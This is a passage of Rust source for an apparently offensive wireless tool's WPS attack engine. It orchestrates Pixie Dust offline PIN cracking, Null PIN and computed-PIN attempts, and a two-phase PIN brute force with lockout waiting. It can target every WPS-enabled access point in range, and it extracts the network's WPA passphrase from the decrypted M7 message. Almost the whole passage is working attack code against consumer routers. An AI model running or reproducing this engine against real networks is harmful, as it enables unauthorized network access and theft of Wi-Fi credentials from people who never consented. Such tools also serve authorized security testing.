                        self.e_s1.copy_from_slice(es1_data);
                        self.has_e_s1 = true;
                    }
                }
            }
        }

        self.last_msg_body = wps_body.to_vec();
        self.has_e_s1
    }

    /// Parse M7 from AP: decrypt E-S2 + extract WiFi credentials (SSID + PSK).
    fn parse_m7(&mut self, wps_body: &[u8]) -> Option<String> {
        let msg = match parse_wps_message(wps_body) {
            Some(m) if m.msg_type == WpsMessageType::M7 => m,
            _ => return None,
        };

        if let Some(enc) = &msg.encrypted_settings {
            if let Some(plaintext) = decrypt_encrypted_settings(&self.keywrapkey, &self.authkey, enc) {
                // Extract E-S2
                if let Some(es2_data) = tlv_find(&plaintext, attr::E_SNONCE2) {
                    if es2_data.len() == 16 {
                        self.e_s2.copy_from_slice(es2_data);
                        self.has_e_s2 = true;
                    }
                }

                // Extract credentials
                if let Some((psk, _ssid)) = extract_credentials_from_settings(&plaintext) {
                    if !psk.is_empty() {
                        self.last_msg_body = wps_body.to_vec();
                        return Some(psk);
                    }
                }
            }
        }

        None
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  WpsAttack — the attack engine (SharedAdapter architecture)
// ═══════════════════════════════════════════════════════════════════════════════

/// WPS attack engine.
pub struct WpsAttack {
    params: WpsParams,
    info: Arc<Mutex<WpsInfo>>,
    events: Arc<EventRing<WpsEvent>>,
    running: Arc<AtomicBool>,
    done: Arc<AtomicBool>,
    /// Skip current sub-attack in Auto mode (one-shot, cleared by engine).
    skip_attack: Arc<AtomicBool>,
    /// Skip current target in --all mode (one-shot, cleared by engine).
    skip_target: Arc<AtomicBool>,
}

impl WpsAttack {
    pub fn new(params: WpsParams) -> Self {
        Self {
            params,
            info: Arc::new(Mutex::new(WpsInfo::default())),
            events: Arc::new(EventRing::new(1024)),
            running: Arc::new(AtomicBool::new(false)),
            done: Arc::new(AtomicBool::new(false)),
            skip_attack: Arc::new(AtomicBool::new(false)),
            skip_target: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Signal to skip the current sub-attack (e.g., move to next in Auto chain).
    pub fn skip_attack(&self) {
        self.skip_attack.store(true, Ordering::SeqCst);
    }

    /// Signal to skip the current target (move to next AP in --all mode).
    pub fn skip_target(&self) {
        self.skip_target.store(true, Ordering::SeqCst);
    }

    /// Start the WPS attack on a background thread.
    ///
    /// Targets come from the scanner's Ap structs — NOT from params.
    /// Single target = `vec![ap]`. Multi-target = all WPS-enabled APs.
    /// This follows the PMKID golden pattern.
    pub fn start(&self, shared: SharedAdapter, targets: Vec<Ap>) {
        let info = Arc::clone(&self.info);
        let events = Arc::clone(&self.events);
        let running = Arc::clone(&self.running);
        let done = Arc::clone(&self.done);
        let skip_attack = Arc::clone(&self.skip_attack);
        let skip_target = Arc::clone(&self.skip_target);
        let params = self.params.clone();

        running.store(true, Ordering::SeqCst);
        done.store(false, Ordering::SeqCst);
        skip_attack.store(false, Ordering::SeqCst);
        skip_target.store(false, Ordering::SeqCst);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.running = true;
            info.start_time = Instant::now();
            info.attack_type = params.attack_type;
            info.target_total = targets.len() as u32;
            if let Some(first) = targets.first() {
                info.bssid = first.bssid;
                info.ssid = first.ssid.clone();
                info.channel = first.channel;
            }
            info.phase = if targets.is_empty() { WpsPhase::Done } else { WpsPhase::KeyGeneration };
        }

        thread::Builder::new()
            .name("wps".into())
            .spawn(move || {
                let reader = shared.subscribe("wps");
                let tx_fb = shared.tx_feedback();
                tx_fb.reset();
                run_wps_multi(&shared, &reader, &targets, &params, &info, &events, &running, &skip_attack, &skip_target, &tx_fb);
                running.store(false, Ordering::SeqCst);
                done.store(true, Ordering::SeqCst);
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.running = false;
                    info.phase = WpsPhase::Done;
                    info.tx_feedback = tx_fb.snapshot();
                }
            })
            .expect("failed to spawn wps thread");
    }

    pub fn signal_stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    pub fn is_done(&self) -> bool {
        self.done.load(Ordering::SeqCst)
    }

    #[allow(dead_code)]
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    pub fn info(&self) -> WpsInfo {
        self.info.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    pub fn events(&self) -> Vec<WpsEvent> {
        self.events.drain()
    }

    #[allow(dead_code)]
    pub fn name(&self) -> &'static str {
        "wps"
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Multi-target orchestrator — iterates targets sequentially
// ═══════════════════════════════════════════════════════════════════════════════

fn run_wps_multi(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    targets: &[Ap],
    params: &WpsParams,
    info: &Arc<Mutex<WpsInfo>>,
    events: &Arc<EventRing<WpsEvent>>,
    running: &Arc<AtomicBool>,
    skip_attack: &Arc<AtomicBool>,
    skip_target: &Arc<AtomicBool>,
    tx_fb: &crate::core::TxFeedback,
) {
    let attack_start = Instant::now();
    let attack_id = next_attack_id();

    // Emit AttackStarted — first target info for the initial delta
    if let Some(first) = targets.first() {
        shared.emit_updates(vec![StoreUpdate::AttackStarted {
            id: attack_id,
            attack_type: AttackType::Wps,
            target_bssid: first.bssid,
            target_ssid: first.ssid.clone(),
            target_channel: first.channel,
        }]);
    }

    for (idx, target) in targets.iter().enumerate() {
        if !running.load(Ordering::SeqCst) { break; }
        skip_target.store(false, Ordering::SeqCst); // reset per target

        // Inter-target delay (skip first)
        if idx > 0 && params.inter_target_delay > Duration::ZERO {
            thread::sleep(params.inter_target_delay);
        }

        // Update info for this target
        {
            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
            i.target_index = idx as u32 + 1;
            i.bssid = target.bssid;
            i.ssid = target.ssid.clone();
            i.channel = target.channel;
            i.rssi = target.rssi;
            i.vendor = target.vendor.clone();
            i.wifi_gen = match target.wifi_gen {
                crate::protocol::ieee80211::WifiGeneration::Legacy => "Legacy".to_string(),
                crate::protocol::ieee80211::WifiGeneration::Wifi4 => "WiFi4".to_string(),
                crate::protocol::ieee80211::WifiGeneration::Wifi5 => "WiFi5".to_string(),
                crate::protocol::ieee80211::WifiGeneration::Wifi6 => "WiFi6".to_string(),
                crate::protocol::ieee80211::WifiGeneration::Wifi6e => "WiFi6E".to_string(),
                crate::protocol::ieee80211::WifiGeneration::Wifi7 => "WiFi7".to_string(),
            };
            i.wps_version = target.wps_version;
            i.wps_device_name = target.wps_device_name.clone();
            i.status = WpsStatus::InProgress;
            i.current_pin = String::new();
            i.attempts = 0;
            i.attempts_half1 = 0;
            i.attempts_half2 = 0;
            i.half1_found = false;
            i.half1_pin = String::new();
            i.pin_found = None;
            i.psk_found = None;
            i.has_pixie_data = false;
            i.ap_manufacturer = String::new();
            i.ap_model_name = String::new();
            i.ap_model_number = String::new();
            i.ap_serial_number = String::new();
            i.ap_device_name = String::new();
            i.elapsed = attack_start.elapsed();
            i.tx_feedback = tx_fb.snapshot();
        }

        push_event(shared, events, attack_start, WpsEventKind::TargetStarted {
            bssid: target.bssid,
            ssid: target.ssid.clone(),
            channel: target.channel,
            index: idx as u32 + 1,
            total: targets.len() as u32,
        }, attack_id);

        // Run single target attack
        let target_start = Instant::now();
        run_wps_attack_single(shared, reader, target, params, info, events, running, skip_attack, attack_start, attack_id);
        let target_elapsed = target_start.elapsed();

        // Check skip_target signal
        if skip_target.load(Ordering::SeqCst) {
            push_event(shared, events, attack_start, WpsEventKind::TargetSkipped { idx: idx + 1 }, attack_id);
        }

        // Collect result
        let result_info = info.lock().unwrap_or_else(|e| e.into_inner()).clone();
        let result = WpsResult {
            bssid: target.bssid,
            ssid: target.ssid.clone(),
            channel: target.channel,
            status: result_info.status,
            pin: result_info.pin_found.clone(),
            psk: result_info.psk_found.clone(),
            attempts: result_info.attempts,
            elapsed: target_elapsed,
            manufacturer: result_info.ap_manufacturer.clone(),
            model: result_info.ap_model_name.clone(),
            device_name: result_info.ap_device_name.clone(),
            max_phase: result_info.phase,
        };

        let is_success = result.status == WpsStatus::Success;

        push_event(shared, events, attack_start, WpsEventKind::TargetComplete {
            bssid: target.bssid,
            ssid: target.ssid.clone(),
            status: result.status,
            elapsed_ms: target_elapsed.as_millis() as u64,
        }, attack_id);

        // Emit counters after each target (natural batch point)
        emit_counters(shared, attack_id, info, attack_start, tx_fb);

        {
            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
            i.results.push(result);
            i.results_count += 1;
            if is_success {
                i.success_count += 1;
            }
        }
    }

    // Build and store final result
    {
        let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
        let final_result = WpsFinalResult {
            results: i.results.clone(),
            total_attempts: i.results.iter().map(|r| r.attempts).sum(),
            pins_found: i.success_count,
            elapsed: attack_start.elapsed(),
        };
        i.final_result = Some(final_result);
        i.elapsed = attack_start.elapsed();
        let elapsed_secs = i.elapsed.as_secs_f64();
        if elapsed_secs > 0.0 {
            i.frames_per_sec = i.frames_sent as f64 / elapsed_secs;
        }
        i.tx_feedback = tx_fb.snapshot();
    }

    // Final summary event
    let final_info = info.lock().unwrap_or_else(|e| e.into_inner()).clone();
    push_event(shared, events, attack_start, WpsEventKind::AttackComplete {
        status: if final_info.success_count > 0 { WpsStatus::Success } else { final_info.status },
        elapsed: attack_start.elapsed(),
        attempts: final_info.results_count,
    }, attack_id);

    // Emit AttackComplete with final results
    shared.emit_updates(vec![StoreUpdate::AttackComplete {
        id: attack_id,
        attack_type: AttackType::Wps,
        result: AttackResult::Wps {
            pin_found: final_info.pin_found,
            psk_found: final_info.psk_found,
            attempts: final_info.results.iter().map(|r| r.attempts).sum(),
            results: final_info.results,
        },
    }]);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Single-target attack — DH keygen + exchange dispatch
// ═══════════════════════════════════════════════════════════════════════════════

fn run_wps_attack_single(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    target: &Ap,
    params: &WpsParams,
    info: &Arc<Mutex<WpsInfo>>,
    events: &Arc<EventRing<WpsEvent>>,
    running: &Arc<AtomicBool>,
    skip_attack: &Arc<AtomicBool>,
    start: Instant,
    attack_id: AttackId,
) {
    let our_mac = shared.mac();
    let bssid = target.bssid;
    let channel = target.channel;

    // TX options: max range + ACK feedback, chip-aware rate selection
    let has_he = shared.caps().contains(ChipCaps::HE);
    let tx_opts = TxOptions::max_range_ack(channel, has_he);

    // Lock channel
    if channel > 0 {
        if let Err(e) = shared.lock_channel(channel, "wps") {
            push_event(shared, events, start, WpsEventKind::Error {
                message: format!("Channel lock failed: {}", e),
            }, attack_id);
            set_status(info, WpsStatus::Error);
            return;
        }
        push_event(shared, events, start, WpsEventKind::ChannelLocked {
            channel,
        }, attack_id);
        shared.set_attack_target(&target.bssid.0);
        if params.channel_settle > Duration::ZERO {
            thread::sleep(params.channel_settle);
        }

    }

    // Generate DH keypair.
    // For multi-exchange modes (ComputedPin, Auto, BruteForce), use fast 32-byte keys.
    // For single-exchange modes (PixieDust, NullPin), use full 192-byte keys.
    set_phase(shared, info, WpsPhase::KeyGeneration, attack_id);
    set_detail(info, "Generating 1536-bit DH keypair (modular exponentiation)...");
    let keygen_start = Instant::now();

    let use_fast_dh = matches!(params.attack_type,
        WpsAttackType::ComputedPin | WpsAttackType::Auto | WpsAttackType::BruteForce);
    let dh_result = if use_fast_dh {
        wps_dh_generate_fast()
    } else {
        wps_dh_generate()
    };
    let (privkey, pubkey) = match dh_result {
        Some((priv_k, pub_k)) => (priv_k, pub_k),
        None => {
            push_event(shared, events, start, WpsEventKind::Error {
                message: "DH keypair generation failed".to_string(),
            }, attack_id);
            set_status(info, WpsStatus::Error);
            shared.unlock_channel();
            return;
        }
    };

    push_event(shared, events, start, WpsEventKind::KeyGenerated {
        elapsed_ms: keygen_start.elapsed().as_millis() as u64,
    }, attack_id);

    if !running.load(Ordering::SeqCst) {
        set_status(info, WpsStatus::Stopped);
        shared.unlock_channel();
        return;
    }

    let mut session = WpsSession::new(our_mac, privkey, pubkey);

    // Helper: check if we should stop or skip
    let should_continue = || running.load(Ordering::SeqCst) && !skip_attack.load(Ordering::SeqCst);
    let is_success = || matches!(info.lock().unwrap_or_else(|e| e.into_inner()).status, WpsStatus::Success);

    // Dispatch based on attack type
    match params.attack_type {
        WpsAttackType::PixieDust => {
            run_pixie_dust(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                target.capability, &target.supported_rates, attack_id);

            // After Pixie Dust, also try Null PIN if we reached M3 (AP is responsive)
            let status = info.lock().unwrap_or_else(|e| e.into_inner()).status;
            if matches!(status, WpsStatus::PixieDataOnly) && running.load(Ordering::SeqCst) {
                run_null_pin(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                    target.capability, &target.supported_rates, attack_id);
            }
        }
        WpsAttackType::BruteForce => {
            run_brute_force(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                target.capability, &target.supported_rates, attack_id);
        }
        WpsAttackType::NullPin => {
            run_null_pin(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                target.capability, &target.supported_rates, attack_id);
        }
        WpsAttackType::ComputedPin => {
            run_computed_pins(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                target.capability, &target.supported_rates, &None, attack_id);
        }
        WpsAttackType::Auto => {
            // Smart chain: ComputedPin → PixieDust → NullPin
            // Each step checks skip_attack + running + success before continuing.
            // Sub-attack tracking: push to info.sub_attacks for live view rendering.

            // Clear sub-attacks for this target
            { info.lock().unwrap_or_else(|e| e.into_inner()).sub_attacks.clear(); }

            // Helper: record a sub-attack start/end
            let push_sub = |info: &Arc<Mutex<WpsInfo>>, name: &str, active: bool| {
                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                i.sub_attacks.push(SubAttackInfo {
                    name: name.to_string(),
                    status: WpsStatus::InProgress,
                    detail: String::new(),
                    elapsed: Duration::ZERO,
                    active,
                });
            };
            let finish_sub = |info: &Arc<Mutex<WpsInfo>>, status: WpsStatus, detail: &str, elapsed: Duration| {
                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                if let Some(last) = i.sub_attacks.last_mut() {
                    last.status = status;
                    last.detail = detail.to_string();
                    last.elapsed = elapsed;
                    last.active = false;
                }
            };

            // 1. Computed PINs
            skip_attack.store(false, Ordering::SeqCst);
            push_sub(info, "Computed PINs", true);
            let sub_start = Instant::now();
            run_computed_pins(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                target.capability, &target.supported_rates, &None, attack_id);
            let sub_elapsed = sub_start.elapsed();

            let cur_status = info.lock().unwrap_or_else(|e| e.into_inner()).status;
            if skip_attack.load(Ordering::SeqCst) {
                finish_sub(info, WpsStatus::Stopped, "skipped", sub_elapsed);
                push_event(shared, events, start, WpsEventKind::AttackSkipped { attack_type: "Computed PIN".to_string() }, attack_id);
            } else if matches!(cur_status, WpsStatus::Success) {
                finish_sub(info, WpsStatus::Success, "PIN matched!", sub_elapsed);
            } else {
                let detail = {
                    let i = info.lock().unwrap_or_else(|e| e.into_inner());
                    if i.pin_found.is_some() { "found".to_string() }
                    else { "no candidates".to_string() }
                };
                // Use real status — might be AuthFailed, not just PinWrong
                let sub_status = if detail == "no candidates" { WpsStatus::PinWrong } else { cur_status };
                finish_sub(info, sub_status, &detail, sub_elapsed);
            }

            // 2. Pixie Dust
            if !is_success() && should_continue() {
                skip_attack.store(false, Ordering::SeqCst);
                push_sub(info, "Pixie Dust", true);
                let sub_start = Instant::now();
                run_pixie_dust(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                    target.capability, &target.supported_rates, attack_id);
                let sub_elapsed = sub_start.elapsed();

                let cur_status = info.lock().unwrap_or_else(|e| e.into_inner()).status;
                if skip_attack.load(Ordering::SeqCst) {
                    finish_sub(info, WpsStatus::Stopped, "skipped", sub_elapsed);
                    push_event(shared, events, start, WpsEventKind::AttackSkipped { attack_type: "Pixie Dust".to_string() }, attack_id);
                } else if matches!(cur_status, WpsStatus::Success) {
                    finish_sub(info, WpsStatus::Success, "PIN cracked!", sub_elapsed);
                } else {
                    let phase = info.lock().unwrap_or_else(|e| e.into_inner()).phase;
                    let detail = match phase {
                        WpsPhase::PixieCracking | WpsPhase::Done => "no weak nonces".to_string(),
                        _ => format!("timeout at {}", phase.short_label()),
                    };
                    let status = if matches!(cur_status, WpsStatus::PixieDataOnly) { WpsStatus::PixieDataOnly } else { cur_status };
                    finish_sub(info, status, &detail, sub_elapsed);
                }
            }

            // 3. Null PIN
            if !is_success() && should_continue() {
                skip_attack.store(false, Ordering::SeqCst);
                push_sub(info, "Null PIN", true);
                let sub_start = Instant::now();
                run_null_pin(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                    target.capability, &target.supported_rates, attack_id);
                let sub_elapsed = sub_start.elapsed();

                let cur_status = info.lock().unwrap_or_else(|e| e.into_inner()).status;
                if matches!(cur_status, WpsStatus::Success) {
                    finish_sub(info, WpsStatus::Success, "PIN accepted!", sub_elapsed);
                } else {
                    let phase = info.lock().unwrap_or_else(|e| e.into_inner()).phase;
                    let detail = match phase {
                        WpsPhase::Done => "rejected".to_string(),
                        _ => format!("timeout at {}", phase.short_label()),
                    };
                    // Use the real status from the exchange, not a generic PinWrong
                    finish_sub(info, cur_status, &detail, sub_elapsed);
                }
            }
        }
    }

    // Unlock channel
    shared.unlock_channel();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Pixie Dust — single exchange + offline crack
// ═══════════════════════════════════════════════════════════════════════════════

fn run_pixie_dust(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: MacAddress,
    ssid: &str,
    params: &WpsParams,
    session: &mut WpsSession,
    info: &Arc<Mutex<WpsInfo>>,
    events: &Arc<EventRing<WpsEvent>>,
    running: &Arc<AtomicBool>,
    start: Instant,
    tx_opts: &TxOptions,
    ap_capability: u16,
    ap_rates: &[u8],
    attack_id: AttackId,
) {
    session.pin = "12345670".to_string(); // default PIN for Pixie Dust exchange

    // Run exchange to M4 (we only need M4 for Pixie Dust)
    let result = wps_single_exchange(
        shared, reader, bssid, ssid, params, session, info, events, running, start, tx_opts, 0,
        ap_capability, ap_rates, attack_id,
    );

    match result {
        ExchangeResult::GotM4 => {
            // We have E-Hash1/E-Hash2 from M3 for offline cracking
            {
                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                i.has_pixie_data = true;
            }
            push_event(shared, events, start, WpsEventKind::PixieDataExtracted {
                has_r_s1: true, // We're Registrar — we always know R-S1
            }, attack_id);

            // Offline crack
            set_phase(shared, info, WpsPhase::PixieCracking, attack_id);
            set_detail(info, "Running Pixie Dust offline crack (testing PRNG modes)...");
            push_event(shared, events, start, WpsEventKind::PixieCrackStarted, attack_id);

            let crack_start = Instant::now();
            if let Some((pin, mode)) = pixie_crack_enhanced(session, shared, events, start, attack_id) {
                push_event(shared, events, start, WpsEventKind::PixieCrackSuccess {
                    pin: pin.clone(),
                    elapsed_ms: crack_start.elapsed().as_millis() as u64,
                }, attack_id);
                let _ = mode; // mode already logged via PixiePrngRecovered event
                set_status(info, WpsStatus::Success);
                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                i.pin_found = Some(pin);
            } else {
                push_event(shared, events, start, WpsEventKind::PixieCrackFailed, attack_id);
                set_status(info, WpsStatus::PixieDataOnly);
            }
        }
        ExchangeResult::Stopped => set_status(info, WpsStatus::Stopped),
        ExchangeResult::AuthFailed => set_status(info, WpsStatus::AuthFailed),
        ExchangeResult::AssocFailed => set_status(info, WpsStatus::AssocFailed),
        ExchangeResult::EapFailed => set_status(info, WpsStatus::EapFailed),
        ExchangeResult::M1Failed => set_status(info, WpsStatus::M1Failed),
        ExchangeResult::M3Failed => set_status(info, WpsStatus::M3Failed),
        ExchangeResult::Locked => set_status(info, WpsStatus::Locked),
        _ => set_status(info, WpsStatus::Error),
    }

    // Cleanup: send NACK + disassoc
    send_nack(shared, session, &bssid, tx_opts, info, events, start);
    send_disassoc(shared, bssid, tx_opts, info, events, start, attack_id);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Null PIN — single exchange with "00000000"
// ═══════════════════════════════════════════════════════════════════════════════

fn run_null_pin(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: MacAddress,
    ssid: &str,
    params: &WpsParams,
    session: &mut WpsSession,
    info: &Arc<Mutex<WpsInfo>>,
    events: &Arc<EventRing<WpsEvent>>,
    running: &Arc<AtomicBool>,
    start: Instant,
    tx_opts: &TxOptions,
    ap_capability: u16,
    ap_rates: &[u8],
    attack_id: AttackId,
) {
    session.reset_for_new_attempt();
    session.pin = "00000000".to_string();

    push_event(shared, events, start, WpsEventKind::PinAttempt {
        pin: "00000000".to_string(),
        attempt: 1,
    }, attack_id);
    set_phase(shared, info, WpsPhase::NullPin, attack_id);

    let result = wps_single_exchange(
        shared, reader, bssid, ssid, params, session, info, events, running, start, tx_opts, 2,
        ap_capability, ap_rates, attack_id,
    );

    match result {
        ExchangeResult::PinCorrect { psk } => {
            set_status(info, WpsStatus::Success);
            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
            i.pin_found = Some("00000000".to_string());
            i.psk_found = Some(psk.clone());
            push_event(shared, events, start, WpsEventKind::PinSuccess {
                pin: "00000000".to_string(),
                psk,
            }, attack_id);
        }
        _ => {
            push_event(shared, events, start, WpsEventKind::NullPinFailed, attack_id);
            // Don't overwrite specific failure statuses set by wps_single_exchange
            let current = info.lock().unwrap_or_else(|e| e.into_inner()).status;
            if matches!(current, WpsStatus::InProgress) {
                set_status(info, WpsStatus::PinWrong);
            }
        }
    }

    send_disassoc(shared, bssid, tx_opts, info, events, start, attack_id);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Brute Force — Phase 1 (10K) + Phase 2 (1K)
// ═══════════════════════════════════════════════════════════════════════════════

fn run_brute_force(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: MacAddress,
    ssid: &str,
    params: &WpsParams,
    session: &mut WpsSession,
    info: &Arc<Mutex<WpsInfo>>,
    events: &Arc<EventRing<WpsEvent>>,
    running: &Arc<AtomicBool>,
    start: Instant,
    tx_opts: &TxOptions,
    ap_capability: u16,
    ap_rates: &[u8],
    attack_id: AttackId,
) {
    let max_attempts = if params.max_attempts > 0 { params.max_attempts } else { 11000 };

    // Parse starting PIN for resume
    let (mut start_half1, mut start_half2): (u16, u16) = (0, 0);
    if let Some(ref pin_str) = params.start_pin {
        if let Ok(pv) = pin_str.parse::<u32>() {
            start_half1 = (pv / 10000) as u16;
            start_half2 = ((pv / 10) % 1000) as u16;
        }
    }

    let mut attempts: u32 = 0;
    let mut found_half1: Option<u16> = None;

    // Skip to Phase 2 if resuming with half2 > 0
    if start_half2 > 0 {
        found_half1 = Some(start_half1);
        let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
        i.half1_found = true;
        i.half1_pin = format!("{:04}", start_half1);
    }

    // ── Phase 1: Find first 4 digits ──
    if found_half1.is_none() {
        set_phase(shared, info, WpsPhase::BruteForcePhase1, attack_id);
        push_event(shared, events, start, WpsEventKind::BruteForcePhase1Started {
            total: 10000 - start_half1 as u32,
        }, attack_id);

        for h1 in start_half1..10000 {
            if !running.load(Ordering::SeqCst) || attempts >= max_attempts {
                break;
            }

            let pin = wps_pin_from_halves(h1, 0);
            session.reset_for_new_attempt();
            session.pin = pin.clone();

            {
                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                i.current_pin = pin.clone();
                i.attempts = attempts;
                i.attempts_half1 = h1 as u32 - start_half1 as u32 + 1;
                i.elapsed = start.elapsed();
            }

            push_event(shared, events, start, WpsEventKind::PinAttempt {
                pin: pin.clone(),
                attempt: attempts,
            }, attack_id);

            let result = wps_single_exchange(
                shared, reader, bssid, ssid, params, session, info, events, running, start, tx_opts, 1,
                ap_capability, ap_rates, attack_id,
            );
            attempts += 1;

            match result {
                ExchangeResult::Half1Correct => {
                    found_half1 = Some(h1);
                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                    i.half1_found = true;
                    i.half1_pin = format!("{:04}", h1);
                    push_event(shared, events, start, WpsEventKind::Half1Found {
                        half1: format!("{:04}", h1),
                        attempts,
                    }, attack_id);
                    break;
                }
                ExchangeResult::Locked => {
                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                    i.lockouts_detected += 1;
                    push_event(shared, events, start, WpsEventKind::LockoutDetected {
                        config_error: 15,
                        delay: params.lockout_delay,
                    }, attack_id);
                    set_phase(shared, info, WpsPhase::LockoutWait, attack_id);
                    // Wait through lockout
                    let wait_end = Instant::now() + params.lockout_delay;
                    while Instant::now() < wait_end && running.load(Ordering::SeqCst) {
                        thread::sleep(Duration::from_secs(1));
                    }
                    push_event(shared, events, start, WpsEventKind::LockoutWaitComplete, attack_id);
                    set_phase(shared, info, WpsPhase::BruteForcePhase1, attack_id);
                }
                ExchangeResult::Stopped => {
                    set_status(info, WpsStatus::Stopped);
                    return;
                }
                _ => {
                    // Wrong PIN or error — continue
                    push_event(shared, events, start, WpsEventKind::PinRejected {
                        pin: pin.clone(),
                        half: 1,
                    }, attack_id);
                }
            }

            // Cleanup + delay between attempts
            send_disassoc(shared, bssid, tx_opts, info, events, start, attack_id);
            if running.load(Ordering::SeqCst) && h1 + 1 < 10000 {
                thread::sleep(params.delay_between_attempts);
            }
        }
    }

    // Check if we found half1
    let half1 = match found_half1 {
        Some(h) => h,
        None => {
            if !running.load(Ordering::SeqCst) {
                set_status(info, WpsStatus::Stopped);
            } else {
                set_status(info, WpsStatus::PinWrong);
            }
            return;
        }
    };

    // ── Phase 2: Find last 3 digits + checksum ──
    set_phase(shared, info, WpsPhase::BruteForcePhase2, attack_id);
    push_event(shared, events, start, WpsEventKind::BruteForcePhase2Started {
        half1: format!("{:04}", half1),
        total: 1000 - start_half2 as u32,
    }, attack_id);

    for h2 in start_half2..1000 {
        if !running.load(Ordering::SeqCst) || attempts >= max_attempts {
            break;
        }

        let pin = wps_pin_from_halves(half1, h2);
        session.reset_for_new_attempt();
        session.pin = pin.clone();

        {
            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
            i.current_pin = pin.clone();
            i.attempts = attempts;
            i.attempts_half2 = h2 as u32 - start_half2 as u32 + 1;
            i.elapsed = start.elapsed();
        }

        push_event(shared, events, start, WpsEventKind::PinAttempt {
            pin: pin.clone(),
            attempt: attempts,
        }, attack_id);

        let result = wps_single_exchange(
            shared, reader, bssid, ssid, params, session, info, events, running, start, tx_opts, 2,
            ap_capability, ap_rates, attack_id,
        );
        attempts += 1;

        match result {
            ExchangeResult::PinCorrect { psk } => {
                set_status(info, WpsStatus::Success);
                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                i.pin_found = Some(pin.clone());
                i.psk_found = Some(psk.clone());
                push_event(shared, events, start, WpsEventKind::PinSuccess { pin, psk }, attack_id);
                return;
            }
            ExchangeResult::Locked => {
                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                i.lockouts_detected += 1;
                push_event(shared, events, start, WpsEventKind::LockoutDetected {
                    config_error: 15,
                    delay: params.lockout_delay,
                }, attack_id);
                set_phase(shared, info, WpsPhase::LockoutWait, attack_id);
                let wait_end = Instant::now() + params.lockout_delay;
                while Instant::now() < wait_end && running.load(Ordering::SeqCst) {
                    thread::sleep(Duration::from_secs(1));
                }
                push_event(shared, events, start, WpsEventKind::LockoutWaitComplete, attack_id);
                set_phase(shared, info, WpsPhase::BruteForcePhase2, attack_id);
            }
            ExchangeResult::Stopped => {
                set_status(info, WpsStatus::Stopped);
                return;
            }
            _ => {
                push_event(shared, events, start, WpsEventKind::PinRejected {
                    pin: pin.clone(),
                    half: 2,
                }, attack_id);
            }
        }

        send_disassoc(shared, bssid, tx_opts, info, events, start, attack_id);
        if running.load(Ordering::SeqCst) && h2 + 1 < 1000 {
            thread::sleep(params.delay_between_attempts);
        }
    }

    if !running.load(Ordering::SeqCst) {
        set_status(info, WpsStatus::Stopped);
    } else {
        set_status(info, WpsStatus::PinWrong);
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Single WPS EAP-WSC Exchange
// ═══════════════════════════════════════════════════════════════════════════════

/// Result of a single WPS exchange.
#[allow(dead_code)]
enum ExchangeResult {
    /// Got M4 (Pixie Dust data collected). Used by Pixie Dust mode.
    GotM4,
    /// First half correct (got M6). Brute force Phase 1.
    Half1Correct,
    /// PIN fully correct + credentials extracted.
    PinCorrect { psk: String },
    /// PIN wrong — first half rejected.
    Half1Wrong,
    /// PIN wrong — second half rejected.
    Half2Wrong,
    /// AP locked (config error 15 or 18).
    Locked,
    /// Auth failed.
    AuthFailed,
    /// Assoc failed.
    AssocFailed,
    /// EAP exchange failed.
    EapFailed,
    /// M1 not received from AP.
    M1Failed,
    /// M3 not received from AP.
    M3Failed,
    /// Attack stopped.
    Stopped,
}

/// Run one complete WPS exchange as REGISTRAR.
///
/// Flow: Auth → Assoc → EAPOL-Start → EAP Identity → WSC_Start →
///       ← M1 → M2 → ← M3 → M4 → [← M5 → M6 → ← M7 → NACK]
///
/// `depth`: 0 = Pixie Dust (stop at M3, collect E-Hash data)
///          1 = Phase 1 brute force (stop at M5, check first PIN half)
///          2 = Full exchange (through M7, extract PSK)
fn wps_single_exchange(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: MacAddress,
    ssid: &str,
    params: &WpsParams,
    session: &mut WpsSession,
    info: &Arc<Mutex<WpsInfo>>,
    events: &Arc<EventRing<WpsEvent>>,
    running: &Arc<AtomicBool>,
    start: Instant,
